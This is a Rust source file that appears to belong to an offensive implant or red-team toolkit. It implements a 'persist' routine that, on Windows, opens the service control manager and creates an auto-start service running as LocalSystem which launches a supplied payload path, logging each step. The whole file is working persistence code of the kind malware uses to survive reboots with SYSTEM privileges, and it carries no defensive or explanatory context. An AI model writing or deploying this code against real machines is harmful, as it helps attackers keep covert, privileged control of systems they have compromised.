use crate::log::LogSink;
#[allow(unused_imports)]
use super::{PersistConfig, PersistResult, PersistMethod};

pub fn persist(config: &PersistConfig, log: &LogSink) -> Result<PersistResult, String> {
    if config.name.is_empty() {
        return Err("service name is required".to_string());
    }
    if config.payload_path.is_empty() {
        return Err("payload path is required".to_string());
    }

    #[cfg(not(windows))]
    {
        let _ = log;
        return Err("requires Windows".to_string());
    }

    #[cfg(windows)]
    {
        use std::ffi::CString;
        use std::ptr;

        let svc_name = CString::new(config.name.as_str())
            .map_err(|_| "invalid service name".to_string())?;
        let svc_path = CString::new(config.payload_path.as_str())
            .map_err(|_| "invalid service path".to_string())?;

        unsafe {
            log.step("Step 1: Open service manager");
            let sc_manager = crate::resolve::OpenSCManagerA(
                ptr::null(),
                ptr::null(),
                0x0002, // SC_MANAGER_CREATE_SERVICE
            );
            if sc_manager.is_null() {
                return Err("service manager open failed".to_string());
            }

            log.step("Step 2: Create service");
            let service = crate::resolve::CreateServiceA(
                sc_manager,
                svc_name.as_ptr() as *const u8,
                svc_name.as_ptr() as *const u8, // display name = service name
                0xF01FF,    // SERVICE_ALL_ACCESS
                0x00000010, // SERVICE_WIN32_OWN_PROCESS
                0x00000002, // SERVICE_AUTO_START
                0x00000001, // SERVICE_ERROR_NORMAL
                svc_path.as_ptr() as *const u8,
                ptr::null(), // no load order group
                ptr::null_mut(),
                ptr::null(), // no dependencies
                ptr::null(), // LocalSystem account
                ptr::null(), // no password
            );

            if service.is_null() {
                log.step("Step 3: Close service manager");
                crate::resolve::CloseServiceHandle(sc_manager);
                return Err("service creation failed".to_string());
            }

            log.step("Step 3: Close handles");
            crate::resolve::CloseServiceHandle(service);
            crate::resolve::CloseServiceHandle(sc_manager);

            log.info(format!("  Service configured: {} -> {}", config.name, config.payload_path));
        }

        Ok(PersistResult {
            method: PersistMethod::ServiceCreation,
            description: format!("Service '{}' configured", config.name),
        })
    }
}
